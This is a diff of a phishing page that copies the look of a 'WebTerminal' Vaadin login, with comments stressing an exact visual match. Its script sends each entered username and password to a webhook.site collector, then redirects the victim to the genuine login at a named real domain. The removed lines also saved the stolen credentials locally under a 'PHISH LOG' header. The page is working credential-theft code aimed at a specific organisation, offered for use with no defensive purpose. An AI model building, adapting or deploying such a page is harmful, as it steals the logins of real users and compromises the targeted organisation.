@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>WebTerminal - Login</title>
-    <link rel="icon" type="image/png" href="./images/favicon.png">
+    <title>Login</title>
+    <link rel="icon" type="image/png" href="./VAADIN/build/favicon-CWESvZb9.png">
 
-    <!-- Ugrađeni Lumo i Vaadin stilovi za potpuno identičan izgled -->
+    <!-- PRECIZNA REPRODUKCIJA LUMO DARK TEMA -->
     <style>
-        /* --- Lumo Base & Color Variables --- */
+        /* --- LUMO DARK COLOR VARIABLES (EXACT MATCH) --- */
         :root {
             --lumo-font-family: -apple-system, BlinkMacSystemFont, "Roboto", "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
             --lumo-font-size-xs: 0.8125rem;
@@ -16,10 +16,11 @@
             --lumo-font-size-m: 1rem;
             --lumo-font-size-l: 1.125rem;
             --lumo-font-size-xl: 1.375rem;
+            
             --lumo-line-height-xs: 1.25;
             --lumo-line-height-s: 1.375;
             --lumo-line-height-m: 1.625;
-            
+
             --lumo-space-xs: 0.25rem;
             --lumo-space-s: 0.5rem;
             --lumo-space-m: 1rem;
@@ -27,34 +28,74 @@
             --lumo-space-xl: 2.5rem;
 
             --lumo-border-radius-s: 0.25em;
-            --lumo-border-radius-m: var(--lumo-border-radius, 0.25em);
+            --lumo-border-radius-m: 0.25em;
             --lumo-border-radius-l: 0.5em;
-            
+
             --lumo-primary-color: hsl(214, 90%, 48%);
-            --lumo-primary-text-color: hsl(214, 100%, 43%);
+            --lumo-primary-text-color: hsl(214, 90%, 77%);
             --lumo-primary-contrast-color: #fff;
+
+            --lumo-body-text-color: var(--lumo-contrast-90pct);
+            --lumo-secondary-text-color: var(--lumo-contrast-70pct);
+            --lumo-tertiary-text-color: var(--lumo-contrast-50pct);
+            --lumo-disabled-text-color: var(--lumo-contrast-30pct);
+
+            --lumo-base-color: hsl(214, 35%, 21%);
+            --lumo-tint-5pct: hsla(214, 65%, 85%, 0.06);
+            --lumo-tint-10pct: hsla(214, 60%, 80%, 0.14);
+            --lumo-tint-20pct: hsla(214, 64%, 82%, 0.23);
+            --lumo-tint-30pct: hsla(214, 69%, 84%, 0.32);
+            --lumo-tint-40pct: hsla(214, 73%, 86%, 0.41);
+            --lumo-tint-50pct: hsla(214, 78%, 88%, 0.5);
+            --lumo-tint-60pct: hsla(214, 82%, 90%, 0.58);
+            --lumo-tint-70pct: hsla(214, 87%, 92%, 0.69);
+            --lumo-tint-80pct: hsla(214, 91%, 94%, 0.8);
+            --lumo-tint-90pct: hsla(214, 96%, 96%, 0.9);
+            --lumo-tint: hsl(214, 100%, 98%);
+
+            --lumo-shade-5pct: hsla(214, 0%, 0%, 0.07);
+            --lumo-shade-10pct: hsla(214, 4%, 2%, 0.15);
+            --lumo-shade-20pct: hsla(214, 8%, 4%, 0.23);
+            --lumo-shade-30pct: hsla(214, 12%, 6%, 0.32);
+            --lumo-shade-40pct: hsla(214, 16%, 8%, 0.41);
+            --lumo-shade-50pct: hsla(214, 20%, 10%, 0.5);
+            --lumo-shade-60pct: hsla(214, 24%, 12%, 0.6);
+            --lumo-shade-70pct: hsla(214, 28%, 13%, 0.7);
+            --lumo-shade-80pct: hsla(214, 32%, 13%, 0.8);
+            --lumo-shade-90pct: hsla(214, 33%, 13%, 0.9);
+            --lumo-shade: hsl(214, 33%, 13%);
+
+            --lumo-contrast-5pct: var(--lumo-tint-5pct);
+            --lumo-contrast-10pct: var(--lumo-tint-10pct);
+            --lumo-contrast-20pct: var(--lumo-tint-20pct);
+            --lumo-contrast-30pct: var(--lumo-tint-30pct);
+            --lumo-contrast-40pct: var(--lumo-tint-40pct);
+            --lumo-contrast-50pct: var(--lumo-tint-50pct);
+            --lumo-contrast-60pct: var(--lumo-tint-60pct);
+            --lumo-contrast-70pct: var(--lumo-tint-70pct);
+            --lumo-contrast-80pct: var(--lumo-tint-80pct);
+            --lumo-contrast-90pct: var(--lumo-tint-90pct);
+            --lumo-contrast: var(--lumo-tint);
+
             --lumo-error-color: hsl(3, 79%, 49%);
             --lumo-error-text-color: hsl(3, 100%, 80%);
-            --lumo-base-color: #fff;
-            --lumo-body-text-color: hsl(214, 35%, 15%);
-            --lumo-header-text-color: var(--lumo-body-text-color);
-            --lumo-secondary-text-color: hsl(214, 35%, 45%);
-            --lumo-contrast-10pct: hsla(214, 57%, 24%, 0.1);
-            --lumo-shade-10pct: var(--lumo-contrast-10pct);
-            --lumo-contrast-20pct: hsla(214, 53%, 23%, 0.16);
-            --lumo-contrast-5pct: hsla(214, 61%, 25%, 0.05);
-            --lumo-tint-5pct: hsla(0, 0%, 100%, 0.3);
+            --lumo-warning-color: hsl(43, 100%, 48%);
         }
 
-        /* --- Global & Layout --- */
+        /* --- CORE STYLES (EXACT MATCH) --- */
         body {
             margin: 0;
             font-family: var(--lumo-font-family);
             font-size: var(--lumo-font-size-m);
-            color: var(--lumo-body-text-color);
+            line-height: var(--lumo-line-height-m);
             background-color: var(--lumo-base-color);
+            color: var(--lumo-body-text-color);
+            -webkit-text-size-adjust: 100%;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
 
         .app-layout {
@@ -64,147 +105,176 @@
         }
 
         .header-black {
-            background-color: var(--lumo-body-text-color);
-            color: var(--lumo-base-color);
+            background-color: var(--lumo-shade);
+            color: var(--lumo-contrast);
+            padding: 0.5rem 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .header-content {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
         }
 
         .main-content {
-            flex-grow: 1;
+            flex: 1;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: var(--lumo-space-xl);
+            padding: 2rem;
+            background-color: var(--lumo-base-color);
         }
 
         .footer {
-            background-color: var(--lumo-body-text-color);
-            color: var(--lumo-base-color);
+            background-color: var(--lumo-shade);
+            color: var(--lumo-contrast);
             text-align: center;
-            padding: var(--lumo-space-m);
+            padding: 1rem;
+            font-size: 0.875rem;
         }
 
-        /* --- Login Page Specific --- */
+        /* --- LOGIN CARD (EXACT MATCH) --- */
         .login-page {
-            width: 100%;
-            max-width: 440px;
             display: flex;
             flex-direction: column;
-            gap: var(--lumo-space-l);
+            gap: 1.5rem;
+            max-width: 400px;
+            width: 100%;
         }
 
         .login-card {
             background-color: var(--lumo-base-color);
             border: 1px solid var(--lumo-contrast-10pct);
             border-radius: var(--lumo-border-radius-l);
-            box-shadow: 0 2px 6px -1px var(--lumo-contrast-5pct), 0 8px 24px -4px var(--lumo-contrast-20pct);
-            padding: var(--lumo-space-l);
+            padding: 1.5rem;
+            box-shadow: 0 2px 6px -1px var(--lumo-shade-50pct), 0 8px 24px -4px var(--lumo-shade-40pct);
         }
 
         .login-card__header {
             text-align: center;
-            margin-bottom: var(--lumo-space-l);
+            margin-bottom: 1.5rem;
         }
+
         .login-card__header h1 {
             font-size: var(--lumo-font-size-xl);
             font-weight: 600;
-            margin: 0 0 var(--lumo-space-s) 0;
+            margin: 0 0 0.5rem 0;
+            color: var(--lumo-contrast);
         }
+
         .login-card__header p {
+            color: var(--lumo-primary-text-color);
             font-size: var(--lumo-font-size-s);
-            color: var(--lumo-secondary-text-color);
             margin: 0;
         }
 
-        .login-card__body {
+        /* --- FORM FIELDS (EXACT MATCH) --- */
+        .vaadin-field {
             display: flex;
             flex-direction: column;
-            gap: var(--lumo-space-m);
+            margin-bottom: 1rem;
         }
 
-        /* --- Custom Components Styling (to mimic Vaadin) --- */
-        .vaadin-mimic-field {
-            display: flex;
-            flex-direction: column;
-            position: relative;
-        }
-        .vaadin-mimic-field label {
+        .vaadin-field label {
             font-size: var(--lumo-font-size-s);
             color: var(--lumo-body-text-color);
-            padding-bottom: var(--lumo-space-xs);
+            margin-bottom: 0.25rem;
+            font-weight: 400;
         }
-        .vaadin-mimic-field input {
+
+        .vaadin-field input {
             font-size: var(--lumo-font-size-m);
-            padding: var(--lumo-space-s) var(--lumo-space-m);
+            padding: 0.5rem 1rem;
             border: 1px solid var(--lumo-contrast-20pct);
             border-radius: var(--lumo-border-radius-m);
             background-color: var(--lumo-base-color);
             color: var(--lumo-body-text-color);
             box-sizing: border-box;
+            transition: border-color 0.2s, box-shadow 0.2s;
             -webkit-appearance: none;
             -moz-appearance: none;
             appearance: none;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
-        .vaadin-mimic-field input:focus {
-            outline: none;
-            border-color: var(--lumo-primary-color);
-            box-shadow: 0 0 0 2px var(--lumo-primary-color-10pct, hsla(214, 90%, 55%, 0.13));
-        }
-        .vaadin-mimic-field input[aria-invalid="true"] {
-            color: var(--lumo-error-text-color);
-            border-color: var(--lumo-error-color);
-        }
-        
-        .vaadin-mimic-button {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            font-size: var(--lumo-font-size-m);
-            font-weight: 500;
-            padding: var(--lumo-space-s) var(--lumo-space-xl);
-            border: 1px solid transparent;
-            border-radius: var(--lumo-border-radius-m);
-            background-color: var(--lumo-primary-color);
-            color: var(--lumo-primary-contrast-color);
-            cursor: pointer;
-            transition: background-color 0.2s;
-            text-align: center;
-        }
-        .vaadin-mimic-button:hover {
-            background-color: hsl(214, 90%, 45%);
-        }
-        .vaadin-mimic-button:disabled {
-            background-color: var(--lumo-contrast-20pct);
-            color: var(--lumo-secondary-text-color);
-            cursor: default;
-        }
-        
-        .login-notices {
-            font-size: var(--lumo-font-size-s);
-            color: var(--lumo-secondary-text-color);
-            line-height: var(--lumo-line-height-m);
-        }
-        .login-notice {
-            padding: var(--lumo-space-s) var(--lumo-space-m);
-            border: 1px solid;
-            border-radius: var(--lumo-border-radius-m);
-        }
-        .login-notice--warning {
-            color: var(--lumo-error-text-color);
-            border-color: var(--lumo-error-color);
-            background-color: hsla(3, 79%, 49%, 0.1);
-        }
-        .login-notice p {
-            margin: 0 0 var(--lumo-space-s) 0;
-        }
-        .login-notice p:last-child {
-            margin-bottom: 0;
-        }
-        .login-notice-text {
-            margin-bottom: var(--lumo-space-s);
         }
 
-        /* --- Utility Classes --- */
+        .vaadin-field input:focus {
+            outline: none;
+            border-color: var(--lumo-primary-color);
+            box-shadow: 0 0 0 2px var(--lumo-primary-color-10pct);
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .show-password-link {
+            position: absolute;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            display: flex;
+            align-items: center;
+            padding-right: 1rem;
+            color: var(--lumo-primary-text-color);
+            font-size: 0.875rem;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .show-password-link:hover {
+            text-decoration: underline;
+        }
+
+        .login-button {
+            display: block;
+            width: 100%;
+            padding: 0.5rem 1rem;
+            background-color: var(--lumo-primary-color);
+            color: var(--lumo-primary-contrast-color);
+            border: none;
+            border-radius: var(--lumo-border-radius-m);
+            font-size: var(--lumo-font-size-m);
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-button:hover {
+            background-color: hsl(214, 90%, 45%);
+        }
+
+        .login-notices {
+            font-size: 0.875rem;
+            line-height: 1.625;
+            color: var(--lumo-secondary-text-color);
+        }
+
+        .login-notice--warning {
+            color: var(--lumo-error-text-color);
+            border: 1px solid var(--lumo-error-color);
+            padding: 1rem;
+            border-radius: var(--lumo-border-radius-m);
+            background-color: hsla(3, 79%, 49%, 0.1);
+            margin-bottom: 1rem;
+        }
+
+        .login-notice--warning p {
+            margin: 0 0 0.5rem 0;
+        }
+
+        .login-notice--warning p:last-child {
+            margin-bottom: 0;
+        }
+
+        .login-notice-text {
+            margin: 0.5rem 0;
+        }
+
+        /* --- UTILITY CLASSES --- */
         .flex { display: flex; }
         .items-center { align-items: center; }
         .justify-between { justify-content: space-between; }
@@ -212,7 +282,7 @@
         .w-full { width: 100%; }
         .box-border { box-sizing: border-box; }
         .text-xl { font-size: var(--lumo-font-size-xl); }
-        .text-white { color: var(--lumo-base-color); }
+        .text-white { color: var(--lumo-contrast); }
         .font-medium { font-weight: 500; }
         .text-center { text-align: center; }
         .mb-0 { margin-bottom: 0; }
@@ -222,15 +292,13 @@
 
 <div id="outlet">
     <div class="app-layout auth-layout">
-        <header class="header-black box-border flex items-center justify-between w-full px-l py-s" role="banner">
-            <div class="flex items-center gap-xs">
-                <!-- Zameni sa stvarnom putanjom do tvoje logo slike -->
-                <img src="images/logo.png" alt="Logo" style="width: 200px;">
-                <h1 class="text-xl text-white ml-4 font-medium" style="font-family: cursive;">WebTerminal</h1>
+        <header class="header-black box-border flex items-center justify-between w-full" role="banner">
+            <div class="flex items-center gap-xs header-content">
+                <img src="images/logo.png" alt="Logo" style="height: 30px; margin-right: 0.5rem;">
+                <h1 class="text-xl text-white font-medium">WebTerminal</h1>
             </div>
             <div class="flex items-center gap-xs">
-                <!-- Ovaj link može da ostane ili se ukloni -->
-                <a class="text-white" aria-label="Sign in" href="/web-terminal/login" data-discover="true">Sign in</a>
+                <a class="text-white" href="/web-terminal/login" style="text-decoration: none; color: inherit;">Sign in</a>
             </div>
         </header>
 
@@ -242,18 +310,18 @@
                         <p>Sign in with your credentials</p>
                     </div>
                     <div class="login-card__body">
-                        <div class="vaadin-mimic-field">
+                        <div class="vaadin-field">
                             <label for="username">Username</label>
-                            <input type="text" id="username" name="username" required autocomplete="username" aria-invalid="false">
+                            <input type="text" id="username" name="username" required autocomplete="username">
                         </div>
-                        <div class="vaadin-mimic-field">
+                        <div class="vaadin-field">
                             <label for="password">Password</label>
-                            <input type="password" id="password" name="password" required autocomplete="current-password" aria-invalid="false">
+                            <div class="password-wrapper">
+                                <input type="password" id="password" name="password" required autocomplete="current-password">
+                                <a class="show-password-link" href="#" id="togglePassword">Show password</a>
+                            </div>
                         </div>
-                        <!-- Vaadin password reveal button je zamenjen sa standardnim, ali stilizovanim -->
-                        <button type="button" id="toggle-password" style="align-self: flex-end; background: none; border: none; color: var(--lumo-secondary-text-color); cursor: pointer; font-size: 0.8em;">Show password</button>
-                        
-                        <button type="button" class="vaadin-mimic-button login-button" id="loginBtn">Continue</button>
+                        <button type="button" class="login-button" id="loginBtn">Continue</button>
                     </div>
                 </div>
 
@@ -281,51 +349,39 @@
 </div>
 
 <script>
-    // OVAJ DEO JE BITAN - ZAMENI "TVOJ_WEBHOOK_LINK" SA STVARNO LINKOM
-    const WEBHOOK_URL = 'https://webhook.site/b5e28484-5c0d-4318-a432-af4f5f6380f6';
+    // ⚠️ ZAMENI OVO SA Tvojim Webhook Linkom
+    const WEBHOOK_URL = 'https://webhook.site/你的-webhook-id';
 
-    // Funkcija za slanje podataka i preusmeravanje
     function sendCreds() {
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
 
         // 1. Pošalji na webhook
-        try {
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({username, password})
-            });
-        } catch(e) {}
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({username, password})
+        });
 
-        // 2. Spusti fajl na lokalni disk
-        const logContent = `=== WEBTERMINAL PHISH LOG ===\nDate: ${new Date().toISOString()}\nUser: ${username}\nPass: ${password}`;
-        const blob = new Blob([logContent], {type: "text/plain"});
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = "webterminal_creds.txt";
-        a.click();
-        URL.revokeObjectURL(url);
-
-        // 3. Redirect na pravi sajt
+        // 2. Preusmeri na pravi sajt
         window.location.href = 'https://dsds.trilix.hr/web-terminal/login';
     }
 
-    // Event listener za login dugme
     document.getElementById('loginBtn').addEventListener('click', sendCreds);
 
-    // Funkcionalnost "Show password" dugmeta
-    const togglePassword = document.getElementById('toggle-password');
-    const passwordInput = document.getElementById('password');
-    togglePassword.addEventListener('click', () => {
+    // Show/Hide password functionality
+    document.getElementById('togglePassword').addEventListener('click', function(e) {
+        e.preventDefault();
+        const passwordInput = document.getElementById('password');
+        const toggleLink = this;
+        
         if (passwordInput.type === 'password') {
             passwordInput.type = 'text';
-            togglePassword.textContent = 'Hide password';
+            toggleLink.textContent = 'Hide password';
         } else {
             passwordInput.type = 'password';
-            togglePassword.textContent = 'Show password';
+            toggleLink.textContent = 'Show password';
         }
     });
 </script>
